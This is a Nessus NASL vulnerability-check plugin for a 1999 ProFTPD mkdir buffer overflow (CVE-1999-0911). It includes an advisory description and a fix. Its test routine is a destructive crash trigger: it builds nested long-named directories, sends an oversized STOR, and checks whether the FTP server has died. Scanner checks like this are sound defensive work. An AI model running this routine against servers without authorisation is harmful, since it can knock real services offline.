#
# (C) Tenable Network Security, Inc.
#

#
# This is not a duplicate of 10189 !
#


include("compat.inc");

if(description)
{
 script_id(10190);
 script_version("$Revision: 1.44 $");
 script_cvs_date("$Date: 2016/11/02 14:37:08 $");

 script_cve_id("CVE-1999-0911");
 script_bugtraq_id(612);
 script_osvdb_id(144, 51719);
 
 script_name(english:"ProFTPD 1.2.0pre4 mkdir Command Directory Name Handling Remote Overflow");
 script_summary(english:"Checks if the remote ftp can be buffer overflown");

 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is prone to a buffer overflow attack.");
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote FTP server by creating a large
number of nested directories and then trying to upload a file.  This
issue is known to affect ProFTPD, although other FTP servers may be
affected as well. 

It is likely that a remote attacker can leverage this issue to execute
arbitrary code on the remote host, subject to the privileges under
which the service runs.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/1999/Sep/143");
 script_set_attribute(attribute:"solution", value:
"Configure the service so that directories are not writable by
'anonymous' or any untrusted users. 

If running ProFTPD, upgrade to version 1.2.0pre6 or later; otherwise,
contact the vendor to see if an update exists.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value:"1999/08/31");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:proftpd:proftpd");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");
		  
 script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_writeable_directories.nasl", "wu_ftpd_overflow.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");

#
# The script code starts here : 
#

port = get_ftp_port(default: 21);

login = get_kb_item("ftp/login");
pass  = get_kb_item("ftp/password");

# Then, we need a writeable directory
wri = get_kb_item("ftp/"+port+"/writeable_dir");
if (! wri) wri = get_kb_item_or_exit("ftp/writeable_dir");

nomkdir = get_kb_item_or_exit("ftp/"+port+"/no_mkdir");

banner = get_ftp_banner(port:port);
if (report_paranoia < 2 && (!banner || "ProFTPD" >!< banner)) exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(1);

if (! ftp_authenticate(socket:soc, user:login, pass:pass))
  exit(1, "Could not authenticate on port "+port+".");

  c = string("CWD ", wri, "\r\n");
  send(socket:soc, data:c);
  b = ftp_recv_line(socket:soc);
  cwd = string("CWD ", crap(100), "\r\n");
  mkd = string("MKD ", crap(100), "\r\n");
  num_dirs = 0;
  for(i=0;i<9;i=i+1)
  {
  send(socket:soc, data:mkd);
  b = ftp_recv_line(socket:soc);
  if(!egrep(pattern:"^257 .*", string:b))
  {
   i = 9;
  }
  else
  {
   num_dirs = num_dirs + 1;
   send(socket:soc,data:cwd);
   b = ftp_recv_line(socket:soc);
   if(!egrep(pattern:"^250 .*", string:b))
    {
     i = 9;
    }
   }
  }
  
  
  port2 = ftp_pasv(socket:soc);
  soc2 = open_sock_tcp(port2);
  if(soc2)
  {
   command = string("STOR ", crap(100), "\r\n");
   send(socket:soc, data:command);
   b = ftp_recv_line(socket:soc);
   send(socket:soc2, data:crap(100));
   close(soc2);
   b = ftp_recv_line(socket:soc);
   command = string("HELP\r\n");
   send(socket:soc, data:command);
   b = ftp_recv_line(socket:soc);
   if(!b){
	security_hole(port);
   	exit(0);
	}
  ftp_close(socket:soc);
  
  
  if(!num_dirs)exit(0);
  
  soc = open_sock_tcp(port);
  if(!soc)exit(0);
  ftp_authenticate(socket:soc, user:login, pass:pass);
  for(i=0;i<num_dirs;i=i+1)
  {
   send(socket:soc, data:string("CWD ", crap(100), "\r\n"));
   b = ftp_recv_line(socket:soc);
  }
  
  
  send(socket:soc, data:string("DELE ", crap(100), "\r\n"));
  b = ftp_recv_line(socket:soc);
  send(socket:soc, data:string("CWD ..\r\n"));
  b = ftp_recv_line(socket:soc);
  for(i=0;i<num_dirs; i = i+1)
  {
   send(socket:soc, data:string("RMD ", crap(100), "\r\n"));
   b = ftp_recv_line(socket:soc);
   send(socket:soc, data:string("CWD ..\r\n"));
   b = ftp_recv_line(socket:soc);
  }
  
  ftp_close(socket:soc);
 }
